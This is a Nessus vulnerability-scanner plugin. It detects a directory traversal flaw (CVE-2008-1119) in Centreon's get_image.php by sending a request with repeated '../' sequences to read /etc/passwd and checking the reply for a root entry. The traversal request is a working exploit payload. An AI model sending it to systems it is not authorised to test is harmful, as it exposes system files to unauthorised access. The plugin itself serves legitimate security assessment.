#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31299);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/08 18:22:10 $");

  script_cve_id("CVE-2008-1119");
  script_bugtraq_id(28022);
  script_osvdb_id(42549);
  script_xref(name:"EDB-ID", value:"5204");

  script_name(english:"Centreon include/doc/get_image.php 'img' Parameter Traversal Arbitrary File Access");
  script_summary(english:"Attempts to read a local file with Centreon.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by a
directory traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Centreon or Oreon, a web-based network
supervision program based on Nagios. 

The version of Centreon / Oreon installed on the remote host fails to
sanitize user-supplied input to the 'img' parameter of the
'include/doc/get_image.php' script before using it to display the
contents of a file. Regardless of PHP's 'register_globals' setting,
an unauthenticated, remote attacker can exploit this issue to view
arbitrary files on the remote host, subject to the privileges under
which the web server operates.");
  script_set_attribute(attribute:"see_also", value:"https://github.com/centreon/");
  script_set_attribute(attribute:"solution", value:"
Upgrade to Centreon 1.4.2.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_cwe_id(22);

  script_set_attribute(attribute:"vuln_publication_date", value:"2008/02/28");
  script_set_attribute(attribute:"patch_publication_date", value:"2008/02/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2008/02/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:centreon:centreon");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:merethis:centreon");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2017 Tenable Network Security, Inc.");

  script_dependencies("centreon_detect.nbin");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP", "installed_sw/Centreon");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Centreon";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

# Try to retrieve a local file.
traverse = "../../../../../../../../../../";
file = "etc/passwd";
lang = "en";
url = "/include/doc/get_image.php?lang=" + lang + "&" + "img=" +traverse+ file;

r = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + url,
  exit_on_fail : TRUE
);
res = r[2];

# There's a problem if there's an entry for root.
if (ereg(pattern:"root:.*:0:[01]:", string:res, multiline:TRUE))
{
  security_report_v4(
    port        : port,
    severity    : SECURITY_WARNING,
    file        : file,
    line_limit  : 10,
    request     : make_list(install_url + url),
    output      : chomp(res),
    attach_type : 'text/plain'
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
